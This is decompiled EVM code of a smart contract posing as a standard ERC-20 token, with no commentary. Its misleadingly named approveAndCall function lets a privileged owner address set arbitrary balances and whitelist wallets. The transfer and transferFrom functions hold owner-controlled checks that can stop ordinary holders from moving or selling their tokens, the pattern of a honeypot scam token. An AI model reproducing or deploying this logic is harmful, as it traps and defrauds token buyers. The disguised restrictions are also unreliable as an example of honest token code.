contract main {




// =====================  Runtime code  =====================


const decimals = 18


mapping of uint256 stor0;
mapping of uint8 stor1;
uint256 stor2;
uint256 stor3;
uint256 stor4;
address stor5;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address stor11;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function transferownership(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == stor11
    stor5 = arg1
    return 1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function approveAndCall(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == stor11
    if arg2 > 0:
        balanceOf[address(arg1)] = 10^18 * arg2
    stor1[address(arg1)] = 1
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg3:
        if arg1 != msg.sender:
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            allowance[address(arg1)][address(msg.sender)] -= arg3
        if arg1 != stor11:
            if arg2 != stor11:
                if arg1 != stor5:
                    if not stor1[address(arg1)]:
                        if not stor4:
                            if not stor2:
                                require stor3
                        if stor4 > 0:
                            require stor0[address(arg1)] < stor4
                        if stor2 > 0:
                            require stor2 <= arg3
                        if stor3 > 0:
                            require arg3 <= stor3
        require balanceOf[address(arg1)] >= arg3
        balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] += arg3
        stor0[address(arg1)]++
        emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2:
        if msg.sender != msg.sender:
            require allowance[address(msg.sender)][address(msg.sender)] >= arg2
            allowance[address(msg.sender)][address(msg.sender)] -= arg2
        if stor11 != msg.sender:
            if arg1 != stor11:
                if stor5 != msg.sender:
                    if not stor1[address(msg.sender)]:
                        if not stor4:
                            if not stor2:
                                require stor3
                        if stor4 > 0:
                            require stor0[address(msg.sender)] < stor4
                        if stor2 > 0:
                            require stor2 <= arg2
                        if stor3 > 0:
                            require arg2 <= stor3
        require balanceOf[address(msg.sender)] >= arg2
        balanceOf[address(msg.sender)] -= arg2
        balanceOf[address(arg1)] += arg2
        stor0[address(msg.sender)]++
        emit Transfer(arg2, msg.sender, arg1);
    return 1
}



}
